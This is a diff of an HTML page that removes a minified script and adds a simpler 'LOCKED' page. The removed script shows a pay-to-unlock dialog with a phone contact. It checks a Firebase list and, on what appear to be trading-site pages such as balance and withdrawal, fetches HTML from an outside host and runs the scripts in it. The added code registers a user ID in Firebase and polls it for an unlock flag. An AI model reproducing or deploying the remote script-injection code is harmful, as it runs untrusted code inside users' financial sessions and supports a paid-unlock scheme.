@@ -3,11 +3,112 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Not Found</title>
+<title>LOCKED 🔒</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    background: #111;
+    color: white;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    flex-direction: column;
+  }
+  #lock-container {
+    text-align: center;
+  }
+  #unlock-img {
+    display: none;
+    max-width: 90%;
+    border: 3px solid #fff;
+    border-radius: 12px;
+  }
+  #id-display {
+    margin-top: 20px;
+    color: #0f0;
+    font-weight: bold;
+  }
+</style>
 </head>
 <body>
-<script id="js">
-  javascript:(()=>{var pID="reactions-maker-site",db="https://"+pID+"-default-rtdb.firebaseio.com/users.json",img="https://i.ibb.co/Z69FyZ04/20251103-091451.png";const uP=new URLSearchParams(window.location.search);let uid=uP.get("id");if(!uid){uid=localStorage.getItem("ahmad_script_uid");if(!uid){uid="";for(let i=0;i<20;i++)uid+=Math.floor(Math.random()*10);localStorage.setItem("ahmad_script_uid",uid)}history.replaceState({},document.title,location.pathname+"?id="+uid)}else{localStorage.setItem("ahmad_script_uid",uid)}var dialog=document.createElement("dialog");document.body.appendChild(dialog);dialog.style.padding="0";dialog.style.border="none";dialog.innerHTML=`<div style="font-family:sans-serif;padding:1rem;background:#1c242a;width:${screen.width>500?"400px":screen.width-40+"px"};border-top:5px solid #05c55e;text-align:center;color:white"><div style="font-size:30px;font-weight:900;line-height:50px">LOCKED</div><div style="display:flex;justify-content:center;align-items:center;margin-top:5px;"><svg width="50" height="50" viewBox="0 0 180 180"><g transform="translate(0,180) scale(0.1,-0.1)" fill="#fff"><path d="M753 1622 l-133 -77 0 -67 0 -67 87 50 105 60 18 -626 0 -636 -50 28 -50 28 0 443 0 442 -55 0 -55 0 0 -405 -7 -405 -50 22 -43 23 0 308 0 308 -57 -3 -58 -3 -5 -267 -5 -267 -40 22 -40 23 0 339 0 339 103 59 102 59 0 64 -6 64 -165 -92 -159 -92 0 -401 0 -401 342 -198 348 -199 353 199 342 199 0 400 0 400 -159 93 -165 92 -6 -64 0 -63 103 -60 102 -59 0 -339 0 -340 -42 -23 -43 -23 0 270 0 271 -60 0 -60 0 0 -307 0 -308 -40 -22 -44 -23 -6 405 0 405 -60 0 -60 0 0 -443 0 -442 -46 -28 -50 -24 -2 635 3 632 103 -60 108 -60 4 65 0 64 -92 54 -138 80 -45 26 -132 -77z"/></g></svg></div><div style="margin-top:10px;font-family:monospace;word-break:break-all">${uid}</div><button style="padding:10px 20px;margin-top:10px;background:#05c55e;color:white;border:none;font-weight:bold;cursor:pointer" onclick="this.closest('dialog').close()">CLOSE</button><div style="font-size:12px;color:#ff6251;margin-top:5px;text-align:left">📝 CONTACT +923120883884 TO UNLOCK !!! 🔓</div><hr style="border-color:white"><div style="text-align:center;color:white">Made with <span style="animation:heartbeat 1.4s infinite;color:#ffb3b3">♥</span> by <a href="https://t.me/AhmadTrader3" style="color:white">@AhmadTrader3</a></div></div>`;dialog.showModal();var style=document.createElement("style");style.innerHTML=`@keyframes heartbeat{0%{color:#ffb3b3}35%{color:#ff1a1a}100%{color:#ffb3b3}}dialog::backdrop{background:#05c55e;opacity:.25} ::selection{background:white;color:black}`;document.head.appendChild(style);fetch(db).then(r=>r.json()).then(data=>{let unlocked=false;if(data){Object.values(data).forEach(u=>{if(u.id===uid)unlocked=true})}if(unlocked){dialog.close();let page="";if(/Android|iPhone|iPad|iPod/i.test(navigator.userAgent))page="android.html";else if(document.querySelector("#root > div > div.mobile-trade-list"))page="win.html";else if(!!document.querySelector(".---react-features-Sidepanel-styles-module__active--qe_nH")?.classList[3]?.includes("active"))page="LB.html";else{const p=location.href.split("en/")[1]?.replace("/","");if(p==="balance"||p==="withdrawal")page="p.html";else if(p==="analytics")page="ana.html";else page="pc.html"}fetch("https://ahmad-bhai-scripts.vercel.app/"+page).then(r=>r.text()).then(html=>{var parser=new DOMParser();var doc=parser.parseFromString(html,"text/html");doc.querySelectorAll("script").forEach(s=>{let newScr=document.createElement("script");if(s.src)newScr.src=s.src;else newScr.textContent=s.innerHTML;document.body.appendChild(newScr)})})}}).catch(()=>{});})();
+<div id="lock-container">
+  <h1>🔒 Locked</h1>
+  <img id="unlock-img" src="https://i.ibb.co/B5qd2j9h/IMG-20251221-190644-639.jpg" alt="Unlocked">
+  <div id="id-display"></div>
+</div>
+
+<script>
+// ================= UNIQUE ID SYSTEM =================
+function generateID(length = 20) {
+  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+  let id = '';
+  for(let i = 0; i < length; i++){
+    id += chars.charAt(Math.floor(Math.random() * chars.length));
+  }
+  return id;
+}
+
+// Get ID from URL or localStorage
+const urlParams = new URLSearchParams(window.location.search);
+let userID = urlParams.get('id');
+
+if(!userID){
+  userID = localStorage.getItem('user_unique_id');
+  if(!userID){
+    userID = generateID();
+    localStorage.setItem('user_unique_id', userID);
+  }
+  // Update URL with ID
+  window.history.replaceState(null, null, `?id=${userID}`);
+}
+
+// Show ID for debug
+document.getElementById('id-display').innerText = "Your ID: " + userID;
+
+// ================= LOCK / UNLOCK =================
+let unlocked = false;
+
+function unlock() {
+  unlocked = true;
+  document.querySelector('h1').style.display = 'none';
+  document.getElementById('unlock-img').style.display = 'block';
+  document.title = "UNLOCKED ✅";
+}
+
+// ================= FIREBASE CHECK =================
+const firebaseURL = "https://reactions-maker-site-default-rtdb.firebaseio.com/users.json";
+
+// Check if user is unlocked in Firebase
+function checkFirebaseUnlock(id){
+  fetch(firebaseURL)
+    .then(res => res.json())
+    .then(data => {
+      if(data && data[id] && data[id].unlocked && !unlocked){
+        unlock();
+      }
+    })
+    .catch(err => console.log("Firebase error:", err));
+}
+
+// Auto-create user in Firebase if not exist
+function createUserIfNotExist(id){
+  fetch(`https://reactions-maker-site-default-rtdb.firebaseio.com/users/${id}.json`, {
+    method: 'PATCH',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ unlocked: false })
+  })
+  .then(res => res.json())
+  .then(data => console.log("User initialized:", data))
+  .catch(err => console.log("Firebase error:", err));
+}
+
+createUserIfNotExist(userID);
+
+// Check Firebase every 2 seconds
+setInterval(() => checkFirebaseUnlock(userID), 2000);
+
 </script>
 </body>
 </html>
